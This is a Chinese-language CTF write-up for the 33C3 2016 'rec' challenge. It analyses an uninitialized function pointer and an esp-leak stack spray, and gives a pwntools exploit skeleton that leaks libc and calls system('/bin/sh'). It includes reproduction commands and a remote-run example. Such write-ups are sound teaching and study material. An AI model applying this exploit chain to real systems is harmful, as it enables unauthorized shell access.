# Speedrun：rec（33C3 CTF 2016 / 未初始化函数指针 + 栈喷 + ret2libc）

> 题型：**未初始化函数指针**（`n == 0` 时 `v1` 没赋值）→ 用 **Polish 求和的 esp 泄漏**
> 把 `(函数指针, 参数)` 喷到深层栈 → `call v1()` 变成任意函数调用
> 目标：`puts(___libc_start_main@got)` leak libc，再 `system("/bin/sh")`
> 关键：note 泄漏 `text_base`、Polish 每轮 `esp -= 8`、`atoi` 必须按 signed int32 发送

---

## 0. 一句话结论

```text
32 位 i386、PIE、NX、Canary、FULL RELRO、stripped；菜单式“计算器”

漏洞点（sign）：
  if (n > 0)      v1 = puts_positive;    // 0xc85
  else if (n < 0) v1 = puts_negative;    // 0xcb0
  if (n == 0)     /* v1 未赋值 */
  v1();                                  // 0xd3b: mov eax,[ebp-0x20]
                                         // 0xd3e: call eax

  sign 由 0xd57 调用，而 0xd57 有一块 0x338 字节的未使用栈帧，
  所以 [ebp-0x20] 比其它函数的局部变量深得多（main_ebp-0x384）。
  正常输入根本够不到；但 Polish 求和循环有一个 esp 泄漏：

  polish_sum:                            // 0xaa3，'S' 分支
    for (;;) {
      sub  esp, 8
      push n
      push n
      call identity                      // 0xa91: return arg
      add  esp, 8                        // <-- 只回收 8，但压了 8+8
      sum += n
    }
  // 每轮净效果：esp -= 8，同时把 (n, n) 写到 [esp-0xc] / [esp-0x10]

  连续输入 0x63 个填充数字后，values[-2] 的拷贝正好落在 v1，
  values[-1] 落在 call 时的 [esp]（第一个参数）。

利用：
  1) Take note + Read note -> 泄漏 text_base（note 缓冲区 dword[1] = text+0x6fb）
  2) Polish 喷 [puts, ___libc_start_main@got] -> Sign(0) -> puts(GOT) 泄 libc
  3) Polish 喷 [system, "/bin/sh"]           -> Sign(0) -> shell
```

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

file rec_33c3_2016
readelf -hW rec_33c3_2016 | grep Type
readelf -dW rec_33c3_2016 | grep -E 'BIND_NOW|FLAGS'
readelf -lW rec_33c3_2016 | grep GNU_STACK

python - <<'PY'
from pwn import *
e = ELF('./rec_33c3_2016', checksec=False)
print(e.checksec())
print([k for k in e.got])
PY

strings -tx rec_33c3_2016 | sed -n '1,40p'
objdump -d -M intel rec_33c3_2016 | sed -n '/<main@@Base>:/,/^$/p'
```

关键输出：

```text
ELF 32-bit LSB pie executable, Intel i386, dynamically linked, stripped

  GNU_STACK  RW          -> NX
  BIND_NOW + GNU_RELRO   -> FULL RELRO（GOT 只读）
  函数里 gs:0x14 xor     -> Canary

导入：printf getchar puts atoi setvbuf __libc_start_main __stack_chk_fail
      stdin stdout  （没有 system / execve / open / read / write）
```

菜单：

```text
Calculators are fun!
0 - Take note
1 - Read note
2 - Polish
3 - Infix
4 - Reverse Polish
5 - Sign
6 - Exit
> 
```

| 选项 | 函数 | 说明 |
| --- | --- | --- |
| `0` | `0xd8e(1)` | Take note：`read_line(buf, 0x14)` |
| `1` | `0xd8e(0)` | Read note：`puts(buf)` |
| `2` | `0xaa3` | Polish：前缀求和（漏洞在这里） |
| `3` | `0x87b` | Infix |
| `4` | `0x732` | Reverse Polish |
| `5` | `0xd57 → 0xcdb` | Sign（未初始化函数指针） |
| `6` | — | 退出 |

---

## 2. 关键逆向

### 2.1 `read_line`（0x6c0）：没有可用的栈溢出

```asm
6c0: push ebp / mov ebp,esp / push ebx / sub esp,0x14
6d2: call getchar                 ; c = getchar()
6da: mov  [ebp-0xc], 0            ; i = 0
6e3: (循环体)
6e6: lea  edx,[eax+1]             ; i + 1
6e9: mov  [ebp-0xc], edx          ; i++
6ef: add  eax, [ebp+8]            ; buf + i
6f4: mov  [eax], dl               ; buf[i] = c
6f6: call getchar                 ; c = getchar()
6fe: cmp  i, size / jae 712       ; i >= size 退出
70c: cmp  c, '\n' / jne 6e3
712: mov  BYTE PTR [buf+i], 0     ; buf[i] = 0   (i 可能 == size)
723: buf[size-1] = 0
```

可写的越界只有 1 个 NUL（`buf[size]`），而且：

- note：`buf = [ebp-0x20]`、`size = 0x14` → `buf[0x14] = canary 最低字节`（本来就是 0）
- sign / 运算数：`size = 0xc` → 同样命中 canary 最低字节
- 操作符：`size = 2` → 命中相邻 buffer 的第一个字节

**结论：没有任何可覆盖 saved RIP 的栈溢出**，不要在这里浪费时间。

### 2.2 Take note / Read note（0xd8e）：栈泄漏

```c
void note(int take) {
    char buf[0x14];                 // ebp-0x20，canary 在 ebp-0xc
    if (take) { printf("Your note: "); read_line(buf, 0x14); }
    else      { printf("Your note: "); puts(buf); }
}
```

`buf` 在栈上，函数返回后这块内存会被后续调用复用。菜单选择本身也是
`read_line([ebp-0xe], 2)`，它在 `ebp-0x4c` 留下了 `call getchar` 的返回地址
`text+0x6fb`。于是 `Read note` 打出来的前 8 个字节是：

```text
note[0:4] = 栈地址（比如 main_ebp-0x30，只用来看，不参与计算）
note[4:8] = text_base + 0x6fb
```

```python
p.recvuntil(b"note: ")
raw = p.recvn(8)
text_base = u32(raw[4:8]) - 0x6FB
assert text_base & 0xFFF == 0
```

> 这也是为什么 `puts` 能打出来：`buf` 里是指针，低字节一般不是 0，
> `puts` 会一直打到第一个 0 为止（实测能打 16 字节）。
> 如果运气不好某个指针带 `0x00`，`recvn(8)` 会短读 → 直接重连。

### 2.3 Sign（0xcdb）：`n == 0` 时 `v1` 未初始化

```asm
cdb: push ebp / mov ebp,esp / push ebx / sub esp,0x24
cf8: push 0xc / lea eax,[ebp-0x18] / push eax / call read_line
d10: call atoi
d18: mov [ebp-0x1c], eax          ; n
d1b: cmp DWORD PTR [ebp-0x1c], 0
d1f: jle d2c
d21: lea eax,[ebx-0x2333]         ; 0xc85 = puts_positive
d27: mov [ebp-0x20], eax
d2a: jmp d3b
d2c: cmp DWORD PTR [ebp-0x1c], 0
d30: jns d3b                      ; n == 0 直接跳过，v1 保持原值
d32: lea eax,[ebx-0x2308]         ; 0xcb0 = puts_negative
d38: mov [ebp-0x20], eax
d3b: mov eax, DWORD PTR [ebp-0x20]
d3e: call eax
```

`sign` 的调用链是 `dispatcher -> 0xd57 -> 0xcdb`，而 `0xd57` 做了一件很奇怪的事：

```asm
d57: push ebp / mov ebp,esp
d5a: sub esp,0x338               ; 一大块从未使用的栈空间
d60: call get_pc_thunk
d6a: canary
d75: call 0xcdb                  ; sign 的真实栈帧被压到 main_ebp-0x364
```

所以 `v1` 在 `main_ebp-0x384`，而 note 的 buffer 在 `main_ebp-0x50`：

```text
main_ebp-0x050  note.buf        <- 只能泄漏，够不到 v1
main_ebp-0x384  sign.v1         <- 需要别的办法写
main_ebp-0x38c  sign.call 的 [esp]（第一个参数）
```

`Sign(0)` 第一次调用时 `v1` 里是启动阶段留下的垃圾（本机实测是 libc 的
`__libc_malloc`，`malloc(栈上垃圾指针)` 返回 NULL 所以看起来“无害”）——
**不要指望它**，必须自己把 `v1` 写掉。

### 2.4 Polish（0xaa3）：esp 泄漏

```asm
aa3: push ebp / mov ebp,esp / push ebx / sub esp,0x34
ac0: lea  eax,[ebx-0x2527]       ; 0xa91 = identity（return arg）
ac6: mov  [ebp-0x24], eax
ac9: mov  [ebp-0x28], 0          ; sum = 0
ad0: printf("Operator: ")
ae2: read_line([ebp-0x1a], 2)
af3: cmp  al, 'S' / jne ba1
     ; 'S' 分支：前缀求和
aff: printf("Operand: ")
b11: read_line([ebp-0x18], 0xc)
b22: atoi -> [ebp-0x2c]
b34: jmp b7f
b36: sub  esp, 8
b39: push [ebp-0x2c]
b3c: push [ebp-0x2c]
b3f: mov  eax, [ebp-0x24]
b42: call eax
b44: add  esp, 8                 ; <-- 关键：压了 8 字节却只回收 8
b47: add  [ebp-0x28], eax
b4a: printf("Operand: ")
...
b7f: cmp  BYTE PTR [ebp-0x18], '.' / jne b36
b87: printf("Sum: %d\n", sum)
```

`sub esp,8` + `push n` + `push n` 一共 16 字节，`call` 的返回地址被 `ret` 弹掉，
最后只 `add esp,8` → **每轮 esp 净减 8**，同时把 `n` 写到两个相邻 dword。
紧接着的 `printf("Operand: ")` 会把其中一份覆盖掉，能活到 `Sign` 的那份
每轮只保留 1 个 dword，相邻两轮相隔 8 字节。

于是连续输入 N 个数字，等价于在 `polish_esp` 下方每 8 字节留下一个可控 dword。
从起始写入点到 `v1` 的距离是：

```text
v1 - 起始写入点 = 0x318 = 99 * 8
-> 第 100 个操作数（下标 99）落在 v1，
   第 101 个操作数（下标 100）落在 v1+8 = call 时的 [esp]，即第一个参数
-> 填充 99 = 0x63 个 + 2 个目标 = 0x65 个数字
```

实测（本机 2.24 / 2.43 都一样）：

```python
polish_spray(io, list(range(0x63)) + [puts, lsm_got])
# 之后：
#   [sign_ebp-0x20] = puts        <- v1
#   [sign_esp]      = lsm_got     <- call 的第一个参数
```

> 填充值本身会被覆盖掉，具体是多少无所谓（0..0x62 就行）。

### 2.5 为什么是任意函数调用

`call eax` 之前只做了 `mov eax,[ebp-0x20]`，没有设置任何参数寄存器；
cdecl 的参数就在栈上：

```text
sign_esp     = sign_ebp-0x28
v1           = sign_ebp-0x20 = sign_esp+8
call 之后： [esp] = 返回地址（0xd40）
           [esp+4] = v1 下方 8 字节 = 我们喷的 values[-1]
```

于是 `Sign(0)` 等价于 `((void(*)(void*))v1)(values[-1])`：

- `v1 = puts@plt (text+0x520)`，参数 = `___libc_start_main@got (text+0x2fe0)` → leak libc
- `v1 = system`，参数 = `libc + "/bin/sh"` → shell

FULL RELRO 只影响“写 GOT”，这里只**读** GOT，不受影响。

---

## 3. 交互脚本骨架

```python
def s32(v):                      # atoi 走 strtol：> INT_MAX 会饱和成 0x7fffffff
    v &= 0xFFFFFFFF
    return v - 0x100000000 if v >= 0x80000000 else v

def polish_spray(p, values):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Operator:", b"S")
    for v in values:
        p.sendlineafter(b"Operand:", str(s32(v)).encode())
    p.sendlineafter(b"Operand:", b".")

def sign_zero(p):
    p.sendlineafter(b"> ", b"5")
    p.sendline(b"0")

# stage 1
p.sendlineafter(b"> ", b"0"); p.sendlineafter(b"note: ", b"123")
p.sendlineafter(b"> ", b"1"); p.recvuntil(b"note: ")
raw = p.recvn(8)
text_base = u32(raw[4:8]) - 0x6FB

polish_spray(p, list(range(0x63)) + [text_base + 0x520, text_base + 0x2FE0])
sign_zero(p)
lsm = u32(p.recvn(4))
libc_base = lsm - libc.symbols["__libc_start_main"]

# stage 2
polish_spray(p, list(range(0x63)) + [libc_base + libc.symbols["system"],
                                     libc_base + next(libc.search(b"/bin/sh\x00"))])
sign_zero(p)
```

完整可运行版本见 `25_rec_33c3_2016_exp.py`（带短读重连、5 次重试）。

---

## 4. 本地验证

> 需要“换一台机器从零复现”的完整顺序（取二进制、校验 hash、建 venv、排错表）见 **§8**；
> 本节只做拿到文件后的快速验证。

32 位二进制需要 i386 loader。本机没有 `/lib/ld-linux.so.2` 时，先取一份
i386 libc（原题同代 2.24，取自 old-releases）：

```bash
cd /tmp
curl -O 'http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.24-3ubuntu2.2_i386.deb'
rm -rf /tmp/libc224 && mkdir -p /tmp/libc224/root
dpkg -x libc6_2.24-3ubuntu2.2_i386.deb /tmp/libc224/root
ls /tmp/libc224/root/lib/ld-linux.so.2 \
   /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6
```

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'
echo 'flag{rec_local_ok}' > flag.txt

I386_LD=/tmp/libc224/root/lib/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc224/root/lib/i386-linux-gnu \
python 25_rec_33c3_2016_exp.py LOCAL

rm -f flag.txt
```

正确输出（地址随机）：

```text
[*] note leak: stack = 0xffde0518, text = 0xf7f576fb
[+] lsm = 0xf7d33060, libc = 0xf7d0d000, system = 0xf7d61830, binsh = 0xf7edf167
__PWNED__
flag{rec_local_ok}
[+] GOT THE FLAG: flag{rec_local_ok}
```

仓库里 `libc-2.24.so` 就是上面解包出来的 2.24-3ubuntu2.2 i386（仅本地复现用）。

远程（必须提供**目标同版本**的 libc）：

```bash
LIBC=./libc-2.24.so HOST=target.example.com PORT=9999 \
python 25_rec_33c3_2016_exp.py
```

原题服务端是 Ubuntu 16.10 的 glibc **2.24-3ubuntu2**，公开 writeup 的偏移：

```text
___libc_start_main = 0x18180
system             = 0x3a8b0
"/bin/sh"          = 0x15cbcf
```

本仓库的 `libc-2.24.so` 是 2.24-3ubuntu2.2（`__libc_start_main` 同样是 `0x18180`，
`system = 0x3b020`、`/bin/sh = 0x15f7cf`），**只用来本地跑**；
远程先用 `__libc_start_main` leak 确认版本，再决定用哪份 libc。

> 这套利用对 libc 不敏感的部分：`text+0x6fb`、`text+0x520`、`text+0x2fe0`、
> 0x63 个填充数字，都是二进制自己的栈帧决定的；本机用 2.43 跑也一模一样。

---

## 5. 交互坑

1. **`atoi` 会饱和，地址必须按 signed int32 发送**

   `atoi = (int)strtol`。在本机用 loader 直接启动时 PIE 被映射到 `0xf7f48000`，
   `puts = 0xf7f48520`，`str()` 发出去是 `4159993120` > `INT_MAX`，
   `strtol` 返回 `0x7fffffff` → `call 0x7fffffff` 直接崩。
   所有值都走 `s32()`，例如 `0xf7f48520 -> -134967008`。

2. **填充数量固定是 `0x63`**

   它由 `0xd57` 的 `0x338` 帧和 Polish 的 `sub esp,0x34` 共同决定，
   跟 libc 无关。改一个数字，`v1` 和参数就会错位 8 字节。

3. **`values[-2]` 落 `v1`，`values[-1]` 落 `[esp]`**

   两个值要成对发；写反了就是 `system` 只有地址没有参数，或者反过来。

4. **note 泄漏可能短读**

   两个 dword 里只要有一个字节是 `0x00`，`puts` 就提前结束。
   脚本检查 `recvn(8)` 长度和 `text_base & 0xfff`，失败就重连。

5. **`puts(GOT)` 也可能短读**

   `___libc_start_main` 的地址若带 `0x00`，只会打出 1~3 字节。
   脚本检查 `recvn(4)`，同样靠重连解决。

6. **两阶段都要重新喷**

   Polish 返回后 `leave; ret` 会恢复 esp，但栈上喷的内容已经被 `sign` 消费掉；
   第二阶段必须再喷一次 `[system, binsh]`。

7. **FULL RELRO + Canary 都没有被绕过，也不需要绕**

   不写 GOT，不改 canary：整个利用只是 `call [ebp-0x20]` 的调用目标控制。
   想找“溢出点”会一无所获（`read_line` 的越界只有一个 NUL）。

8. **note 够不到 `v1`**

   note buffer 在 `main_ebp-0x50`，`v1` 在 `main_ebp-0x384`。
   note 只负责泄漏，写 `v1` 必须靠 Polish 的 esp 泄漏。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：32 位 PIE / NX / Canary / FULL RELRO，stripped |
| 0:20–0:40 | 跑一遍菜单：0 note、1 read、2 Polish、5 Sign；`Sign(0)` 崩 |
| 0:40–1:00 | 反汇编 `0xcdb`：`n==0` 时 `[ebp-0x20]` 未赋值，`0xd3e call eax` |
| 1:00–1:15 | 反汇编 `0xd57`：`sub esp,0x338` 的空洞 → `v1` 在 `main_ebp-0x384` |
| 1:15–1:35 | 反汇编 `0xaa3`：`sub esp,8 + 2×push + add esp,8` → 每轮 esp-8 |
| 1:35–1:50 | 算出填充数 `0x63`，`values[-2]`/`values[-1]` 对应 `v1`/参数 |
| 1:50–2:05 | note 泄漏：`dword[1] = text+0x6fb`，拿到 text base |
| 2:05–2:20 | 两阶段：`puts(lsm@got)` → `system("/bin/sh")`，本地 flag 验证 |

---

## 7. 题型识别卡

```text
32 位 PIE + FULL RELRO + Canary，但没有栈溢出
+ 菜单里有一个 “未初始化函数指针” 的 call eax
+ 某个循环的 sub esp / add esp 不配对（esp 泄漏）
= 用“esp 泄漏”把 (函数指针, 参数) 喷到深层栈，把 call 变成任意函数调用
```

```text
漏 libc 的套路仍然适用：call puts(GOT) -> 算 base -> call system("/bin/sh")
区别只是“写栈”的原语不是溢出，而是循环里的 esp 泄漏。
```

一句话：**`Sign(0)` 的 `call [ebp-0x20]` 给的是任意调用，Polish 求和的 `esp -= 8`
把 `puts` 和 `___libc_start_main@got` 精确喷进去；先 leak，再喷 `system("/bin/sh")`。**

---

## 8. 从零复现清单（照抄即可）

> 目标：在一台干净的 x86_64 Linux 上，只靠本文档把 flag 打出来。
> 前面的 §2 解释原理，这一节只给“按顺序执行的命令 + 校验点 + 预期输出”。

### 8.1 环境（一次性）

```bash
cd '/home/yfhd5/Pwn Writeups'
python3 -m venv .venv          # 已存在则跳过
source .venv/bin/activate      # 本仓库所有命令都要求先激活 .venv
pip install -r requirements.txt
python -c 'import pwn; print(pwn.__version__)'
```

需要系统里有 `curl` 与 `dpkg`（Debian/Ubuntu 系自带）；磁盘约 100 MB。

### 8.2 取题目二进制，并校验

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

# 公开归档：ctfs/write-ups-2016 的 33c3-ctf/pwn/rec-200
curl -fsSL -o rec_33c3_2016 \
  https://raw.githubusercontent.com/ctfs/write-ups-2016/master/33c3-ctf/pwn/rec-200/rec

sha256sum rec_33c3_2016
# 期望：cc549fbc6045151381eae842b8f4b7a3130c1bcf0e22d5f2093ad92008ebed49
# 大小 9564 B（md5 07d38b4bc09644f6aaa8e7bce843b285）
```

> 已核对：该 URL 下载到的文件与仓库里现有的 `rec_33c3_2016`、根目录的
> `rec_33c3_2016` 三者 sha256 完全相同。
> 如果 `raw.githubusercontent.com` 被墙/被 RST，可改走 GitHub API：
> ```bash
> curl -fsSL -o /tmp/rec.json \
>   https://api.github.com/repos/ctfs/write-ups-2016/git/blobs/90f74f94052d7c077d4cbe637593d7a120baac39
> python -c "import base64,json;open('rec_33c3_2016','wb').write(base64.b64decode(json.load(open('/tmp/rec.json'))['content']))"
> sha256sum rec_33c3_2016   # 同上的 cc549fbc…
> ```

### 8.3 取 i386 glibc 2.24（含 loader）

```bash
mkdir -p /tmp/libc224/root
cd /tmp
curl -fsSL -O \
  http://old-releases.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.24-3ubuntu2.2_i386.deb
dpkg -x libc6_2.24-3ubuntu2.2_i386.deb /tmp/libc224/root

ls /tmp/libc224/root/lib/ld-linux.so.2 \
   /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6
md5sum /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6
# 期望：79f8c0d940ae393b3ad1be40892c9c84

cp /tmp/libc224/root/lib/i386-linux-gnu/libc.so.6 \
   '/home/yfhd5/Pwn Writeups/ret2libc/libc-2.24.so'
```

> `/tmp/libc224` 只是临时解包目录，重装系统后按上面三行重建即可。
> EXP 的两个环境变量就指这里：`I386_LD` = loader，`I386_LIBPATH` = 含 `libc.so.6` 的目录。

### 8.4 跑通（一条命令）

```bash
cd '/home/yfhd5/Pwn Writeups'
source .venv/bin/activate
cd ret2libc

echo 'flag{repro_ok}' > flag.txt      # EXP 拿到 shell 后会 cat flag*
I386_LD=/tmp/libc224/root/lib/ld-linux.so.2 \
I386_LIBPATH=/tmp/libc224/root/lib/i386-linux-gnu \
python 25_rec_33c3_2016_exp.py LOCAL
rm -f flag.txt
```

预期输出（地址随机，格式固定）：

```text
[*] note leak: stack = 0xffde0518, text = 0xf7f576fb
[*] text = 0xf7f57000, puts = 0xf7f57520, lsm@got = 0xf7f59fe0
[+] lsm = 0xf7d33060, libc = 0xf7d0d000, system = 0xf7d61830, binsh = 0xf7edf167
__PWNED__
flag{repro_ok}
[+] GOT THE FLAG: flag{repro_ok}
```

自检要点：

- `text` 必须以 `000` 结尾（PIE 页对齐），否则 note 泄漏判断失败；
- `libc` 也必须以 `000` 结尾，否则 `LIBC=` 给错了文件；
- 最后一行必须是 `[+] GOT THE FLAG: …`。只出现 `__PWNED__` 说明 shell 通了、
  但当前目录没有 `flag.txt`（这本身也说明 EXP 成功）。

### 8.5 换了副本时的自检（二进制一致性）

如果手上不是 8.2 那份文件，先用这两条确认它是同一个 build：

```bash
readelf -hW rec_33c3_2016 | grep Type        # 期望 DYN（PIE）
objdump -d -M intel rec_33c3_2016 | grep -E '^ +(6c0|aa3|cdb|d3e):'
# 期望 4 行：
#   6c0: push ebp     <- read_line
#   aa3: push ebp     <- Polish
#   cdb: push ebp     <- Sign
#   d3e: call eax     <- 未初始化函数指针的调用点（必须是 call eax）
```

再看 §2 里出现的四个地址是否都在：`0x6c0`（read_line）、`0xaa3`（Polish）、
`0xcdb`（Sign）、`0xd3e`（`call eax`）。四个偏移 `0x520` / `0x2fe0` / `0x6fb`
与填充数 `0x63` **只对这一个 build 成立**；换 build 必须重算（重算方法见 §2.4、§2.5）。

### 8.6 失败排查

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| `[-] no 32-bit loader` | 没设 `I386_LD`，且系统无 `/lib/ld-linux.so.2` | 按 §8.3 解包并传环境变量 |
| `note leak truncated` | 泄漏里出现 `\x00`，`puts` 提前截断 | 直接重跑（脚本自带 5 次重试） |
| `bad text base 0x...` | 泄漏错位或不是同一 build | 校验 sha256；重跑 |
| `libc leak truncated` | `___libc_start_main` 地址含 `\x00` | 直接重跑 |
| `bad libc base 0x...` | `LIBC=` 指到了 64 位或别的版本 | 用 §8.3 的 i386 `libc.so.6` |
| 进程 `SIGSEGV` 在 `0x7fffffff` | 地址按无符号发送，被 `atoi` 饱和 | 用脚本里的 `s32()`，别手发十进制 |
| `SIGSEGV` 在别的怪地址 | 填充数/偏移不对（换了 build 或改了脚本） | 回到 §2.4 重算 `0x63` |

### 8.7 远程（留档）

原题服务已下线，将来若有复刻靶机：

```bash
LIBC=./libc-2.24.so HOST=<host> PORT=<port> \
  python 25_rec_33c3_2016_exp.py
```

- 必须提供**目标同版本**的 libc；先用 leak 出的 `__libc_start_main` 对版本。
- 原题 Ubuntu 16.10 / glibc 2.24-3ubuntu2：`system=0x3a8b0`、`/bin/sh=0x15cbcf`；
  仓库里的 2.24-3ubuntu2.2：`system=0x3b020`、`/bin/sh=0x15f7cf`，
  两者 `__libc_start_main` 都是 `0x18180`。
- 需要 TLS（CTF² 等）时加 `SSL=1`。

### 8.8 本次验证记录（可对照）

| 日期 | 环境 | 结果 |
| --- | --- | --- |
| 2026-11-23 | i386 glibc 2.24-3ubuntu2.2（`/tmp/libc224`） | `[+] GOT THE FLAG: flag{rec_dup_check}` |
| 2026-11-23 | i386 glibc 2.43（`/tmp/libc32`） | `[+] GOT THE FLAG: flag{rec_243_check}` |
| 2026-11-23 | 隔离目录 `/tmp/rectest` 连续 5 次 | 5/5 成功（早期 2 次失败是并行命令抢 `flag.txt`） |
| 2026-11-23 | **cleanroom**：`/tmp/reprotest` 新目录，按 §8.2/§8.3 取二进制与 libc（重新 `curl` deb、`dpkg -x` 到 `/tmp/libc224fresh`），按 §8.4 运行 | `[+] GOT THE FLAG: flag{cleanroom_ok}`（证明本清单本身可独立复现） |


